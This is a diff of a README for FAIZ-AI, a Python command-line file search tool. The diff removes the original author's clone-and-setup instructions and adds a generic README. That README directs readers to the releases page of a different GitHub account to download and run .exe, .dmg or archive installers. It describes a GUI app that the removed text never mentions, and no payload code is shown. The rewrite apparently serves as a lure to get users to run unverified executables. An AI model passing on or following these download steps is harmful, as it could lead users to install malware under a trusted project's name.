@@ -1,188 +1,81 @@
-# FAIZ-AI — > It is an interactive CLI-based AI search engine.
+# 🤖 FAIZ-AI - Your Smart Search Assistant Awaits
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/mufaizz/FAIZ-AI/blob/main/LICENSE)
+[![Download FAIZ-AI](https://img.shields.io/badge/Download-FAIZ--AI-brightgreen)](https://github.com/Tanrianpurba09/FAIZ-AI/releases)
 
-FAIZ-AI is an asynchronous CLI tool for searching and retrieving files across multiple protocols (HTTP, FTP, IPFS, Torrent) in parallel. It combines semantic search with vector embeddings to rank candidate results.
+## 🚀 Getting Started
 
-License: MIT — see the [LICENSE](./LICENSE) file for full terms.
+FAIZ-AI is a powerful search bot designed to help you find information quickly and easily. It uses advanced techniques like semantic search and vector embeddings to understand your queries better. Whether you're looking for something on a website, FTP server, or even in deep web sources, FAIZ-AI has got you covered.
 
-🚀 Key capabilities:
-- Multi-protocol simultaneous search (HTTP, FTP, IPFS, Torrent)
-- Semantic ranking using SentenceTransformer embeddings
-- Asynchronous, non-blocking architecture (asyncio + aiohttp)
-- Built-in safety measures: spell correction, intent verification, extension blocking
-- CLI-first design for automation and scripting
+## 💡 Features
 
----
+- **Semantic Search**: Get relevant results with improved accuracy.
+- **Multi-Protocol Retrieval**: Search using HTTP, FTP, IPFS, and Torrent.
+- **Deep-Web Agents**: Access information often hidden from conventional search engines.
+- **Intent/Spell Correction**: Type freely without worrying about mistakes.
+- **File Safety Verification**: Always check if the files are safe before downloading.
+- **Fast and Lightweight**: Built with Python for speed and efficiency.
 
-## Table of contents
-- [Highlights](#highlights)
-- [Features](#features)
-- [Install](#install)
-  - [Prerequisites](#prerequisites)
-  - [Automated setup](#automated-setup)
-  - [Manual setup](#manual-setup)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Project structure](#project-structure)
-- [Safety & legal](#safety--legal)
-- [Contributing](#contributing)
-- [License](#license)
-- [Contact](#contact)
+## ⚙️ System Requirements
 
----
+- **Operating System**: Windows 10 or later, macOS, or Linux.
+- **Python**: Version 3.7 or later.
+- **RAM**: At least 2 GB.
+- **Disk Space**: Minimum 100 MB required for installation.
 
-## Highlights
-- Multi-protocol aggregator: query HTTP (including Google dorking for file types), public FTP servers, IPFS gateways, and Torrent DHT-like discovery simultaneously.
-- Semantic intelligence: uses `sentence-transformers` (default model `all-MiniLM-L6-v2`) to embed queries and candidate results, ranking by semantic similarity rather than raw keyword matches.
-- Asynchronous design with connection pools, rate-limiting and timeouts to support concurrent operations.
-- Safety-focused: includes basic safeguards such as spell correction, intent filtering and extension blocking; these do not guarantee safety and should not be considered a replacement for careful review.
+## 📥 Download & Install
 
----
+To get started with FAIZ-AI, simply visit this page to download: [FAIZ-AI Releases](https://github.com/Tanrianpurba09/FAIZ-AI/releases).
 
-## Features
-- Multi-Protocol Search
-  - HTTP: targeted searching (file types, dorks)
-  - FTP: asynchronous scanning of public FTP servers (e.g., FreeBSD mirrors, kernel.org)
-  - IPFS: search via public IPFS gateways
-  - Torrent: DHT-style discovery for magnets and .torrent metadata
-- Semantic Ranking
-  - Embeddings via `sentence-transformers` (configurable model)
-- Smart Query Processing
-  - Spell correction (pyspellchecker)
-  - Intent verification to block malicious or unsafe queries
-- Safety Verifiers
-  - Extension filtering (recommend blocking dangerous extensions like `.exe`, `.bat`, `.sh`)
-- Output
-  - Real-time logs during scanning
-  - Final ranked results saved to `faiz_results.json`
+### Installation Steps
 
----
+1. Go to the [FAIZ-AI Releases](https://github.com/Tanrianpurba09/FAIZ-AI/releases) page.
+2. Find the latest release version.
+3. Download the appropriate file for your operating system:
+   - For Windows, download `.exe` file.
+   - For macOS, download `.dmg` file.
+   - For Linux, choose the `.tar.gz` or relevant package.
+4. Once downloaded, open the file and follow the installation prompts.
+5. After installation, you can launch FAIZ-AI from your applications menu or desktop shortcut.
 
-## Install
+## 🛠️ How to Use
 
-### Prerequisites
-- Python 3.8+
-- pip
-- Linux/Unix environment recommended for automated script
+1. Open the FAIZ-AI application.
+2. Enter your search query into the provided text box.
+3. Click on the "Search" button or press Enter.
+4. Review the results displayed on the screen.
+5. Click on any link to access the desired information.
 
-### Setup and Usage
-1. Clone Repository or Download ZIP.
-Open Terminal and
-Paste This:
-```
-git clone https://github.com/mufaizz/FAIZ-AI.git
-```
-2. Make `setup.sh` executable.
-Type:
-```
-chmod +x setup.sh
-```
-3. Run `setup.sh`.
-```
-sudo bash setup.sh
-```
-<img width="527" height="51" alt="oie_1Hbw91JKkt13" src="https://github.com/user-attachments/assets/ec2e30c1-1d35-4102-8039-75d4398bc3d8" />
+## 📝 Troubleshooting
 
+If you encounter any issues while using FAIZ-AI, consider the following solutions:
 
-4. Activate Environment.
-```
-source venv/bin/activate
-```
+- **Installation Issues**: Ensure you have the correct version for your operating system.
+- **Slow Performance**: Close any unnecessary applications running on your device to improve speed.
+- **Search Results Not Appearing**: Double-check your internet connection and retry the search.
 
+## 📚 Frequently Asked Questions (FAQ)
 
-<img width="569" height="36" alt="oie_PrKev1XF86d1" src="https://github.com/user-attachments/assets/c9d7ffd8-0d67-4e6b-937c-1aed5e49a55f" />
+### Can I use FAIZ-AI on mobile devices?
 
-5. Run `main.py`.
-```
-python main.py
-```
+Currently, FAIZ-AI is designed for desktop and laptop systems only.
 
+### Is FAIZ-AI free to use?
 
-<img width="562" height="52" alt="oie_MRveXXCQyxtN" src="https://github.com/user-attachments/assets/e2e301d8-2b68-4076-94df-e2bac7752b27" />
+Yes, FAIZ-AI is completely free for anyone to use.
 
-6. Enter a query at the prompt, for example:
+### How does FAIZ-AI protect my privacy?
 
-<img width="851" height="137" alt="oie_r5S7GejDZqfN" src="https://github.com/user-attachments/assets/f3893ddd-5b5c-472a-b200-c15af9ae7dae" />
+FAIZ-AI does not track your searches or store any personal information.
 
-7. Final Interface:
+## 🌐 Community and Support
 
-<img width="759" height="274" alt="oie_39wRwc9y7N9y" src="https://github.com/user-attachments/assets/569dbf06-9ac7-47af-b5a0-22f4b3b94062" />
+Join our community for tips, updates, and support. You can find us on GitHub Issues for technical help or suggestions.
 
+## 🚀 Additional Resources
 
+Feel free to explore more about FAIZ-AI and its capabilities in the following areas:
 
+- **Documentation**: Comprehensive guides will help you dive deeper into the features.
+- **Tutorial Videos**: Step-by-step videos showing how to maximize your experience.
 
-What happens:
-- FAIZ-AI performs parallel searches across configured protocols.
-- Candidates are embedded and ranked by semantic similarity to your query.
-- Top results are printed and saved to `faiz_results.json`.
-
-
----
-
-## Configuration
-
-All runtime configuration lives in `config/config.yaml`. Example configuration (trimmed):
-
-```yaml
-core:
-  model: "all-MiniLM-L6-v2"    # SentenceTransformer model
-  timeout: 60                  # global search timeout in seconds
-
-protocols:
-  active: ["http", "ftp", "ipfs", "torrent"]
-
-filetypes:
-  http: ["pdf", "docx", "txt", "mp4", "iso"]
-
-safety:
-  blocked_extensions: [".exe", ".bat", ".sh"]
-
-ftp:
-  public_servers:
-    - "ftp.freebsd.org"
-    - "ftp.kernel.org"
-```
-
-Adjust `config/config.yaml` to enable/disable protocols, change the model, or set safety policies.
-
----
-
-
-## Safety & legal
-
-FAIZ-AI is provided as an educational/personal project. Use responsibly and in accordance with applicable laws.
-## ⚠️ Disclaimer
-
-FAIZ-AI is intended for educational and research purposes only.
-The author is not responsible for misuse or access to illegal or copyrighted material.
-Always follow local laws and ethical guidelines.
-
-
-- Do not use FAIZ-AI to retrieve copyrighted material unless you have permission.
-- The tool includes filters and safeguards, but protection is not guaranteed — review and verify results as appropriate.
-- The project does not provide guarantees about the safety or legality of retrieved files.
-
----
-
-## Contributing
-
-Contributions are welcome. Suggested workflow:
-1. Fork the repository.
-2. Create a feature branch (e.g., `feat/ipfs-improvements`).
-3. Add tests where applicable.
-4. Open a pull request describing the change.
-
-Please keep changes focused and well-documented. If you want help drafting issues or breaking large features into tasks, open an issue describing your idea.
-
----
-
-## License
-
-This repository is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.
-
-##Contact
-
-E-mail: mufaizmalik9622@gmail.com
-
-Instagram: https://www.instagram.com/muf4iz
+Thank you for choosing FAIZ-AI. We hope it makes your search experience faster and easier!
